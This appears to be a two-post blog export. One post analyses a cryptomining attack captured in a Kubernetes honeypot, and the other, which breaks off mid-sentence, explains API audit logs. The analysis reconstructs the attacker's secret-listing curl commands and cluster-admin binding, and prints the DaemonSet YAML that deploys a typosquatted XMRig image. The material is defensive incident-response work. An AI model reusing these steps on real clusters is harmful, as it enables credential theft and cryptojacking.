[{"content":" Analysis of a real-world attack captured in a Kubernetes honeypot.\nEnvironment High Level For this environment we are analyzing activity which occurred in a Kubernetes (k8s) cluster exposed to the Internet. The k8s api server was configured to allow anonymous access. The anonymous user was granted administrator capabilities within the cluster. This was done to mirror one of the (unfortunately) more commonly occurring misconfigurations which lead to clusters being compromised.\nLogs from the cluster were streamed into a Splunk instance for easy parsing.\nInitial Access This honeypot was configured with one expected route in by a malicious actor. In order to monitor for malicious behavior I start with a simple query looking at any api calls made by the system:anonymous user. It is nothing fancy but does well as an initial hunt to show when something has occurred. In Splunk this is the query:\nindex=k8s sourcetype=kube:apiserver-audit \u0026#34;user.username\u0026#34;=\u0026#34;system:anonymous\u0026#34; |table _time, userAgent, verb, requestURI, sourceIPs{}, responseStatus.code |sort -_time The attack began at 2022-10-23 12:30:24.602 with a malicious request to list all the secrets in the Kubernetes cluster. The userAgent for this request was python-requests/2.27.1.\nFor those new to Kubernetes, secrets are base64 encoded blobs of data. These blobs are used by the applications running within k8s to store sensitive information (think api keys used to access 3rd party apis, db creds, etc.). Service account tokens are also stored as secrets and used to access resources within the cluster via the k8s api server.\nApproximately seven minutes later (2022-10-23 12:37:31.733) a call to create a clusterrolebinding with the userAgent of curl/7.64.0 was made.\nA clusterrolebinding is a k8s object which ties a role (object which defines permission boundaries) and a service account together.\nThe request to create the clusterrolebinding is below:\nLooking at the request under the objectRef section we can see the clusterrolebinding which was created was named kube-controller-manager. We know the request was successful because under the responseStatus section we can see the code: 201. The verb for this request is create which tells us that the malicious actor is creating a new resource.\nIf we trust the UserAgent field and this request was generated with curl it would look something similar to:\ncurl -k -X Post https://k8s-api-server/api/rbac.authorization.k8s.io/v1/clusterrolebindings -d @data.yml Due to a limitation of the logging configuration I was unable to capture the configuration yaml for the clusterrolebinding when the request came in. This would have shown the role and service account which were tied together. The next iteration of this honeypot will remediate this issue as I increase the logging around clusterrolbinding objects. Take this as a lesson to ensure your own production logs are configured in a way that will be useful during an investigation. Ultimately for this attack it did not really matter.\nAttempting to view the clusterrolebinding also fails because it had been deleted by the time analysis occurred:\nk get clusterrolebinding kube-controller-manager Error from server (NotFound): clusterrolebindings.rbac.authorization.k8s.io \u0026#34;kube-controller-manager\u0026#34; not found Throughout the log files the authorization.k8s.io/reason field shows the default user in the kube-system namespace had the ability to utilize the cluster-admin role via the kube-controller-manager clusterrolebinding. Based on these messages we can infer the missing request to create the clusterrolebinding looked something similar to:\n\u0026#34;kind\u0026#34;: \u0026#34;ClusterRoleBinding\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;rbac.authorization.k8s.io/v1\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;kube-controller-manager\u0026#34;, }, \u0026#34;subjects\u0026#34;: [ { \u0026#34;kind\u0026#34;: \u0026#34;ServiceAccount\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;namespace\u0026#34;: \u0026#34;kube-system\u0026#34; } ], \u0026#34;roleRef\u0026#34;: { \u0026#34;apiGroup\u0026#34;: \u0026#34;rbac.authorization.k8s.io\u0026#34;, \u0026#34;kind\u0026#34;: \u0026#34;ClusterRole\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;kube-admin\u0026#34; } It is possible other subjects could have been defined in addition to the kube-system default service account, however there was no evidence of this behavior.\nTen seconds after the clusterrolebinding request at 2022-10-23 12:37:41.482 another request came through listing secrets in the kube-system namespace. This request was made to get authentication details stored in secrets in the kube-system namespace.\nUsing curl the attacker would have utilized something similar to:\ncurl -k https://k8s-api-server/api/v1/namespaces/kube-system/secrets At this point the malicious actor had new credentials to access the cluster. With them they move on to the next phase of the attack.\nRemoving the Competition To follow the activity of the new service account I adjusted the Splunk search to the following:\nindex=k8s sourcetype=kube:apiserver-audit user.username=system:serviceaccount:kube-system:default |table _time, user.username, userAgent, verb, requestURI, responseStatus.code |sort -_time After getting credentials the attacker pivots from (what we\u0026rsquo;re presuming is) curl to using kubectl. At 2022-10-23 12:37:51.281 we see a series of 32 requests all within a second of each other. Each request had a timeout=32s at the end. These are all the results of running the command: kubectl api-resources. This command lists all the api-resources available on a cluster. More research needs to be done here, but I believe kubectl makes this call behind the scenes periodically.\nAfter those events a series of delete requests were sent starting at 2022-10-23 12:37:53.339. Looking at the requestURI field we can see there is a request to delete a deployment in the default namespace called worker-deployment, another request to delete a deployment called api-proxy in the kube-system namespace, and finally a request to delete a pod running in the default namespace called kube-secure-fhgxtsjh.\nThese all returned 404 response codes because they are resources which did not exist in the cluster. I expect this was an attempt to remove competition who may also exist on the cluster already. It could also be an attempt to clean up a possible existing foothold created via some other means that were not relevant to this attack.\nAssuming kubectl was used to generate these events the following commands were issued:\nkubectl delete deployment worker-deployment -n default kubectl delete deployment api-proxy -n kube-system kubectl delete pod kube-secure-fhgxtsjh - default The last delete command is interesting because it was a single one-off pod the attacker was looking for, but it is named in a way to blend in as if it were a part of a deployment/daemonset. Perhaps future honeypots will reveal what these resources are.\nDirectly after attempting to delete the resources above, we see a request at 2022-10-23 12:38:10.451 to check for a daemonset called kube-controller in the kube-system namespace.\nDaemonsets are objects in k8s that instruct k8s to deploy a copy of the pod to every single node in the cluster. A lot of monitoring and security tools will be deployed via daemonsets to ensure complete cluster visibility.\nA 404 response was returned indicating that the daemonset kube-controller did not exist. Two seconds later at 2022-10-23 12:38:12.762 another call was issued to check for the kube-system namespace. This seemed odd since earlier the attacker was already interacting with the namespace. Perhaps they wanted to re-validate it existed, or they wanted something out of the raw response. At 2022-10-23 12:38:19.830 the same two requests come through again.\nAfter these requests the malicious actor moves on to the next phase of the attack.\nActions on Objectives Now that the cluster has been cleaned up of any unwanted deployments or pods the attacker moved on to deploying a daemonset. At 2022-10-23 12:38:21.132 there was a create request issued to create a daemonset in the kube-system namespace.\nA few seconds later a follow-up request was made to check the status of the newly created object. In the picture below we can see the full response from the api server for the create request.\nUnder the objectRef section we can see the name of the daemonset is kube-controller, and confirm the namespace is kube-system. The resposne code of 201 indicates the request was successful. Once again the username who made the request is system:serviceaccount:kube-system:default. By looking at the authorization.k8s.io.reason we can tell that the service account is associated with a clusterrolbinding granting access to the cluster-admin role.\nAt the time of analysis, the daemonset still existed. We can see in the output below the kube-controller daemonset was created 5 days and 21 hours ago, and currently has 2 pods ready and available.\nk get ds -n kube-system NAME DESIRED CURRENT READY UP-TO-DATE AVAILABLE NODE SELECTOR AGE kube-controller 2 2 2 2 2 \u0026lt;none\u0026gt; 5d21h By requesting the details of the daemonset we can get the yaml definition file below:\nkubectl get ds kube-controller -n kube-system -o yaml apiVersion: apps/v1 kind: DaemonSet metadata: annotations: deprecated.daemonset.template.generation: \u0026#34;1\u0026#34; kubectl.kubernetes.io/last-applied-configuration: | {\u0026#34;apiVersion\u0026#34;:\u0026#34;apps/v1\u0026#34;,\u0026#34;kind\u0026#34;:\u0026#34;DaemonSet\u0026#34;,\u0026#34;metadata\u0026#34;:{\u0026#34;annotations\u0026#34;:{},\u0026#34;labels\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;kube-controller\u0026#34;},\u0026#34;name\u0026#34;:\u0026#34;kube-controller\u0026#34;,\u0026#34;namespace\u0026#34;:\u0026#34;kube-system\u0026#34;},\u0026#34;spec\u0026#34;:{\u0026#34;selector\u0026#34;:{\u0026#34;matchLabels\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;kube-controller\u0026#34;}},\u0026#34;template\u0026#34;:{\u0026#34;metadata\u0026#34;:{\u0026#34;labels\u0026#34;:{\u0026#34;app\u0026#34;:\u0026#34;kube-controller\u0026#34;}},\u0026#34;spec\u0026#34;:{\u0026#34;containers\u0026#34;:[{\u0026#34;image\u0026#34;:\u0026#34;kubrnetesio/kube-controller:1.0.1\u0026#34;,\u0026#34;imagePullPolicy\u0026#34;:\u0026#34;IfNotPresent\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;kube-controller\u0026#34;}],\u0026#34;tolerations\u0026#34;:[{\u0026#34;operator\u0026#34;:\u0026#34;Exists\u0026#34;}]}}}} creationTimestamp: \u0026#34;2022-10-23T17:38:21Z\u0026#34; generation: 1 labels: app: kube-controller name: kube-controller namespace: kube-system resourceVersion: \u0026#34;593374\u0026#34; uid: c0a58c6e-be4b-46d9-83fc-d997ba99d55d spec: revisionHistoryLimit: 10 selector: matchLabels: app: kube-controller template: metadata: creationTimestamp: null labels: app: kube-controller spec: containers: - image: kubrnetesio/kube-controller:1.0.1 imagePullPolicy: IfNotPresent name: kube-controller resources: {} terminationMessagePath: /dev/termination-log terminationMessagePolicy: File dnsPolicy: ClusterFirst restartPolicy: Always schedulerName: default-scheduler securityContext: {} terminationGracePeriodSeconds: 30 tolerations: - operator: Exists updateStrategy: rollingUpdate: maxSurge: 0 maxUnavailable: 1 type: RollingUpdate status: currentNumberScheduled: 2 desiredNumberScheduled: 2 numberAvailable: 2 numberMisscheduled: 0 numberReady: 2 observedGeneration: 1 updatedNumberScheduled: 2 This definition file is extremely helpful. There are no volumes or extra permissions granted to the pod which means no container escapes were attempted (more than likely kernel exploits are still a possibility). We can also see the image that is used kubrnetesio/kube-controller:1.0.1. At first glance it may look like a legitimate image, but kubrnetesio is a typo squat on kubernetes. We will dive deeper into this image later, for now we will continue to build out the timeline of events using the k8s api audit logs a bit more.\nCleaning Up 10 seconds after validating the daemonset was up the attacker begins to cleanup and harden the cluster from further attack. At 2022-10-23 12:39:40.748 a request was made to delete the clusterrolebinding for cluster-system-anonymous. This effectively prevents anyone else from connecting to the cluster without authentication.\nUsing kubectl the command would look something similar to:\nkubectl delete clusterrolebinding cluster-system-anonymous Next, two more commands came in a few seconds later. The first was to delete a daemonset api-proxy in the kube-system namespace and another to delete the clusterrolebinding kube-controller-manager created for this attack.\nThe attacker issued a few more commands but they all fail because they have deleted the clusterrolebinding and have effectivly locked themselves out of the cluster as well. The only exception is the daemonset they created which could be a foothold into the cluster.\nFor a complete timeline of the attack check out the \u0026lsquo;Complete Timeline of the Attack\u0026rsquo; section at the bottom of the page.\nProcess Analysis To determine the process(s) associated with the malicious pods we first needed to determine a container id on the host. The kubectl command below revealed the pod name as well as the host where the container was running.\nkubectl get pods -n kube-system -o wide NAME READY STATUS RESTARTS AGE IP NODE kube-controller-cq8f8 1/1 Running 0 4d5h 100.96.2.4 ip-172-20-45-237.ec2.internal kube-controller-m2gjc 1/1 Running 0 6d20h 100.96.1.14 ip-172-20-49-244.ec2.internal Pushing deeper we can query the details for one of the pods and determine a containerid associated with it:\nkubectl get pod kube-controller-cq8f8 -o yaml |grep -i containerid Containerid: 643747d8420547509c2a80f791ef139647fbce9df53478530f9d1e217f1eb982 On the host itself running pstree and searching for the container id the results below were retirmed showing the process of the container was 6340. The only process running in the container was pid 6554, and everything under it was a thread of the process.\nKnowing this, the running kube-controller binary was copied out of the proc folder with cp /proc/6554/exe /tmp/6554 and analysis of the binary began.\nDuring initial analysis attempting to determine if the binary was packed (it\u0026rsquo;s not) the binary showed signs of being an unpacked coin miner.\nTo further confirm the binary was a coin miner (or at least some part of it was) strings was ran searching for xmrig.\nThe results output confirmed this was a coin miner. For further coorobaration VirusTotal also returned results on this binary being a coin miner.\nNetwork connections for the process were also inspected but did not point to anything interesting. Periodically the outbound established ip address would rotate. All observed outbound connections were made to addresses hosted in aws. The network traffic was all encrypted. At this point diving deeper into the network traffic did not seem necessary.\nImage Analysis Carving out the image and viewing it layer by layer helped to confirm what was learned when conducting analysis of the process. There are three layers in this image. The first was the base image used by the attacker to add malicious components to and appears to be an alpine linux image.\nThe second layer was the result of the COPY command moving the kube-controller binary into the image.\nThe third image shows a file .xmrig.json being copied into the image in roots home folder.\nBased on the layer information and the information observed in the daemonset definition file we can infer the Dockerfile for this image would look something similar to:\nfrom alpine:3.13.1 COPY ./kube-controller /kube-controller COPY ./xmrig.json /root/.xmrig.json RUN chmod 755 /kube-controller ENTRYPOINT [\u0026#34;/kube-controller\u0026#34;] After extracting the layers, we can access the json config file for xmrig and get the wallet id as well as other information.\nOn docker hub this image had been pulled over 10,000 times.\nThe image no longer exists on dockerhub and the entire kubrnetesio account has been removed.\nPrevention To prevent this there are a few different things that can be done:\nDon\u0026rsquo;t allow anonymous access Don\u0026rsquo;t expose the api server to the entire Internet Only allow signed trusted images to run on the cluster Build alerts for successful anonymous access. These can be written in a SIEM or via a runtime agent running in the cluster such as Falco. Build alerts for cluster-admin binds. Just like the previous entry the SIEM or something such as Falco or osquery can be utilized here. Make sure your cluster is up to date. Initially I ran this honeypot on the current release of Kubernetes, but the attacks would stop after creating the clusterrolebinding and attempting to query for the service account token. As of Kubernetes 1.24 service account tokens are no longer automatically generated, and they must be manually generated. This group of malicious actors have yet to take this into consideration so their attacks fail despite the anonymous user having full admin permissions on the cluster. Complete Timeline of the Attack Event Time username userAgent verb requestURI Response Code 2022-10-23 12:30:24.602 system:anonymous python-requests/2.27.1 list /api/v1/secrets/ 200 2022-10-23 12:37:31.733 system:anonymous curl/7.64.0 create /apis/rbac.authorization.k8s.io/v1/clusterrolebindings 201 2022-10-23 12:37:41.482 system:anonymous curl/7.64.0 list /api/v1/namespaces/kube-system/secrets 200 2022-10-23 12:37:48.033 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /api?timeout=32s 200 2022-10-23 12:37:49.447 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis?timeout=32s 200 2022-10-23 12:37:51.119 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/autoscaling/v1?timeout=32s 200 2022-10-23 12:37:51.281 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/events.k8s.io/v1?timeout=32s 200 2022-10-23 12:37:51.281 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/authentication.k8s.io/v1?timeout=32s 200 2022-10-23 12:37:51.281 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/apiregistration.k8s.io/v1?timeout=32s 200 2022-10-23 12:37:51.281 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/apps/v1?timeout=32s 200 2022-10-23 12:37:51.281 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/storage.k8s.io/v1?timeout=32s 200 2022-10-23 12:37:51.281 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/certificates.k8s.io/v1?timeout=32s 200 2022-10-23 12:37:51.281 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/flowcontrol.apiserver.k8s.io/v1beta1?timeout=32s 200 2022-10-23 12:37:51.848 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /api/v1?timeout=32s 200 2022-10-23 12:37:51.859 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/events.k8s.io/v1beta1?timeout=32s 200 2022-10-23 12:37:51.969 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/autoscaling/v2?timeout=32s 200 2022-10-23 12:37:51.969 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/batch/v1beta1?timeout=32s 200 2022-10-23 12:37:51.969 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/policy/v1?timeout=32s 200 2022-10-23 12:37:51.969 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/node.k8s.io/v1beta1?timeout=32s 200 2022-10-23 12:37:51.969 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/authorization.k8s.io/v1?timeout=32s 200 2022-10-23 12:37:51.969 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/storage.k8s.io/v1beta1?timeout=32s 200 2022-10-23 12:37:51.969 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/apiextensions.k8s.io/v1?timeout=32s 200 2022-10-23 12:37:51.969 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/rbac.authorization.k8s.io/v1?timeout=32s 200 2022-10-23 12:37:51.969 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/node.k8s.io/v1?timeout=32s 200 2022-10-23 12:37:51.969 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/networking.k8s.io/v1?timeout=32s 200 2022-10-23 12:37:51.969 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/policy/v1beta1?timeout=32s 200 2022-10-23 12:37:51.969 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/discovery.k8s.io/v1?timeout=32s 200 2022-10-23 12:37:51.969 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/autoscaling/v2beta1?timeout=32s 200 2022-10-23 12:37:52.062 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/admissionregistration.k8s.io/v1?timeout=32s 200 2022-10-23 12:37:52.062 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/scheduling.k8s.io/v1?timeout=32s 200 2022-10-23 12:37:52.062 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/autoscaling/v2beta2?timeout=32s 200 2022-10-23 12:37:52.154 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/discovery.k8s.io/v1beta1?timeout=32s 200 2022-10-23 12:37:52.155 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/flowcontrol.apiserver.k8s.io/v1beta2?timeout=32s 200 2022-10-23 12:37:52.155 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/batch/v1?timeout=32s 200 2022-10-23 12:37:52.155 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/coordination.k8s.io/v1?timeout=32s 200 2022-10-23 12:37:53.339 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab delete /apis/apps/v1/namespaces/default/deployments/worker-deployment 404 2022-10-23 12:37:57.898 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab delete /apis/apps/v1/namespaces/kube-system/deployments/api-proxy 404 2022-10-23 12:38:01.766 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab delete /api/v1/namespaces/default/pods/kube-secure-fhgxtsjh 404 2022-10-23 12:38:06.067 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab delete /api/v1/namespaces/default/pods/kube-secure-fhgxt 404 2022-10-23 12:38:10.451 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/apps/v1/namespaces/kube-system/daemonsets/kube-controller 404 2022-10-23 12:38:12.762 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /api/v1/namespaces/kube-system 200 2022-10-23 12:38:16.765 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /openapi/v2?timeout=32s 200 2022-10-23 12:38:19.830 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/apps/v1/namespaces/kube-system/daemonsets/kube-controller 404 2022-10-23 12:38:20.495 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /api/v1/namespaces/kube-system 200 2022-10-23 12:38:21.132 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab create /apis/apps/v1/namespaces/kube-system/daemonsets?fieldManager=kubectl-client-side-apply\u0026amp;fieldValidation=Strict 201 2022-10-23 12:38:30.085 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab get /apis/apps/v1/namespaces/kube-system/daemonsets/kube-controller 200 2022-10-23 12:39:15.761 system:anonymous curl/7.64.0 list /api/v1/namespaces/kube-system/secrets 200 2022-10-23 12:39:40.748 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab delete /apis/rbac.authorization.k8s.io/v1/clusterrolebindings/cluster-system-anonymous?timeout=10s 200 2022-10-23 12:39:42.343 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab delete /apis/apps/v1/namespaces/kube-sytem/daemonsets/api-proxy?timeout=10s 404 2022-10-23 12:39:46.760 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab delete /apis/rbac.authorization.k8s.io/v1/clusterrolebindings/kube-controller-manager?timeout=10s 200 2022-10-23 12:39:49.713 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab list /apis/rbac.authorization.k8s.io/v1/clusterrolebindings?fieldSelector=metadata.name%3Dkube-controller-manager\u0026amp;timeout=10s 403 2022-10-23 12:40:01.102 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab delete /api/v1/namespaces/default/pods/kube-secure-fhgxtsjh?timeout=10s 403 2022-10-23 12:40:08.544 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab delete /api/v1/namespaces/default/pods/kube-secure-fhgxt?timeout=10s 403 2022-10-23 12:40:12.611 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab delete /apis/rbac.authorization.k8s.io/v1/clusterrolebindings/eks-admin?timeout=10s 403 2022-10-23 12:40:18.294 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab list /api/v1/secrets?limit=500\u0026amp;timeout=10s 403 2022-10-23 12:40:24.705 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab list /api/v1/pods?limit=500\u0026amp;timeout=10s 403 2022-10-23 12:40:33.352 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab list /api/v1/configmaps?limit=500\u0026amp;timeout=10s 403 2022-10-23 12:40:42.762 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab list /apis/networking.k8s.io/v1/ingresses?limit=500\u0026amp;timeout=10s 403 2022-10-23 12:40:51.379 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab list /apis/rbac.authorization.k8s.io/v1/clusterroles?limit=500\u0026amp;timeout=10s 403 2022-10-23 12:40:55.609 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab list /apis/rbac.authorization.k8s.io/v1/clusterrolebindings?limit=500\u0026amp;timeout=10s 403 2022-10-23 12:41:03.747 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab list /apis/rbac.authorization.k8s.io/v1/roles?limit=500\u0026amp;timeout=10s 403 2022-10-23 12:41:07.045 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab list /apis/rbac.authorization.k8s.io/v1/rolebindings?limit=500\u0026amp;timeout=10s 403 2022-10-23 12:41:11.267 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab list /api/v1/services?limit=500\u0026amp;timeout=10s 403 2022-10-23 12:41:15.285 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab list /api/v1/serviceaccounts?limit=500\u0026amp;timeout=10s 403 2022-10-23 12:41:19.253 system:serviceaccount:kube-system:default kubectl/v1.24.4 (linux/amd64) kubernetes/95ee5ab list /api/v1/nodes?limit=500\u0026amp;timeout=10s 403 ","permalink":"https://jellyparks.com/posts/k8s-honeypot/","summary":"Analysis of a real-world attack captured in a Kubernetes honeypot.","title":"kubernetes_honeypot_adventures"},{"content":" An overview of the Kubernetes api logs. What fields are useful, and some places where log visibility might be missing in most environments.\nK8s Api Audit logs There are several log sources in a Kubernetes environment. One of the best sources to use during an incident to determine what has occurred on a cluster are the api audit logs. These logs contain all of the requests made to query or modify objects in the cluster. On the surface the api audit logs can be a bit overwhelming. Much like any log source, the more you look at it and the more you work with it the easier it becomes to quickly digest the event data. As a responder there are a few fields we will want to pay attention to: requestURI, sourceIPs, verb, user.username, userAgent.\nfield purpose requestURI This is the resource requested answering the \u0026lsquo;what\u0026rsquo; was requested sourceip Where the request came from verb Answers the question was this creating/modifying a resource or querying information about a resource user.username \u0026lsquo;who\u0026rsquo; made the request userAgent This is the user agent of the application that made the request responseStatus.code annotations.authorization.k8s.io/decision rbac decision, allow/forbid annotations.authorization.k8s.io/reason Description on why a request was allowed user.extra.authentication.kubernetes.io/pod-name pod where request originated user.extra.authentication.kubernetes.io/pod-uid pod uid where request originated Below is a sample api audit log event.\n{ annotations: { authorization.k8s.io/decision: allow authorization.k8s.io/reason: RBAC: allowed by ClusterRoleBinding \u0026#34;cluster-system-anonymous\u0026#34; of ClusterRole \u0026#34;cluster-admin\u0026#34; to User \u0026#34;system:anonymous\u0026#34; } apiVersion: audit.k8s.io/v1 auditID: 5dbc599e-0726-45ae-a2e7-b1fb06c6e6f9 kind: Event level: Metadata objectRef: { apiVersion: v1 resource: secrets } requestReceivedTimestamp: 2022-06-17T12:01:14.222991Z requestURI: /api/v1/secrets responseStatus: { code: 200 metadata: { } } sourceIPs: [ 172.20.39.107 ] stage: ResponseComplete stageTimestamp: 2022-06-17T12:01:14.246392Z user: { groups: [ system:unauthenticated ] username: system:anonymous } userAgent: curl/7.68.0 verb: list } Digging into the event a bit we know the verb is list which tells us that this request is attempting to query data from the server. The username is system:anonymous which means no authentication was performed. The requestURI is api/v1/secrets, this api endpoint is used when attempting to retrieve all of the secrets from every namespace. If the requestURI was api/v1/namespaces/test/secrets then it would have been an attempt to just query secrets from the test namespace.\nThe responseStatus.code value is a 200, just like any other web response code a 200 means success. The two fields under annotations authorization.k8s.io/decision, authorization.k8s.io/reason tell us that the request was authorized from a RBAC pov. The reason goes into further detail of why it was allowed informing us that the ClusterRole cluster-admin is associated with the system:anonymous user via the ClusterRoleBinding cluster-system-anonymous\nWe can see the sourceIP is 172.20.39.107 which happens to be our load balancer in this scenario. If the request was internal to the cluster, it would have had an internal ip of the node the request originated from. This is important to note because in the event of malicious activity originating within a cluster which is also using the anonymous account, sourcing the k8s api requests back to the node is typically as close as you can get to answering \u0026ldquo;where\u0026rdquo; a request came from using the api audit logs. However, if a service account is being used the event will show the exact pod the request originated from as long as are current version of Kubernetes is being utilized. Older versions may not show this level of detail in the log output.\nThe userAgent value is curl/7.68.0. This field can easily be spoofed which makes it hard to trust that curl was used. However, it can often be used to link events together to understand activity originating from the same actor.\nBy using this information, we can infer the request more than likely originated from outside the cluster and the command used to make the request was something similar to this:\ncurl -k https://\u0026lt;KUBERNETES-API-LOAD-BALANCER-SERVER\u0026gt;/api/v1/secrets Let\u0026rsquo;s take a look at one more log output:\n{ annotations: { authorization.k8s.io/decision: forbid authorization.k8s.io/reason: } apiVersion: audit.k8s.io/v1 auditID: 4190c06f-5bb4-4654-a610-02af06ac0593 kind: Event level: RequestResponse objectRef: { apiVersion: v1 namespace: dev resource: pods } requestReceivedTimestamp: 2022-06-18T18:50:08.978700Z requestURI: /api/v1/namespaces/dev/pods?limit=500 responseObject: { apiVersion: v1 code: 403 details: { kind: pods } kind: Status message: pods is forbidden: User \u0026#34;system:serviceaccount:dev:default\u0026#34; cannot list resource \u0026#34;pods\u0026#34; in API group \u0026#34;\u0026#34; in the namespace \u0026#34;dev\u0026#34; metadata: { } reason: Forbidden status: Failure } responseStatus: { code: 403 metadata: { } reason: Forbidden status: Failure } sourceIPs: [ 172.20.59.66 ] stage: ResponseComplete stageTimestamp: 2022-06-18T18:50:08.979502Z user: { extra: { authentication.kubernetes.io/pod-name: [ nettools ] authentication.kubernetes.io/pod-uid: [ 340ea116-a70a-463c-90e8-f7819acf034f ] } groups: [ system:serviceaccounts system:serviceaccounts:dev system:authenticated ] uid: eb04ad0d-29d6-4ea0-8df5-d666b26eebf9 username: system:serviceaccount:dev:default } userAgent: kubectl/v1.24.2 (linux/amd64) kubernetes/f66044f verb: list } As we look through the event details, we can see that kubectl was used to query a list of pods within the dev namespace requestURI=/api/v1/namespaces/dev/pods?limit=500. The response was 403 because the service account (found in the user.username field) system:serviceaccount:dev:default does not have permissions to query for a list of pods within the dev namespace. There are some new fields in this event which help us to quickly identify which pod this took place in. Under the user section we see the following snip:\nThe information in the extras section tells us the exact pod that was used. Since we know the pod name as well as the pod-uid it provides us the opportunity to check the Kubernetes server to determine if the pod is still running. If it is, could snapshot the underlying containers in the pod for further analysis.\nBased on the information in the audit log it would appear the command used to create the event was similar to:\n./kubectl get pods -n dev And if we are lucky enough to have 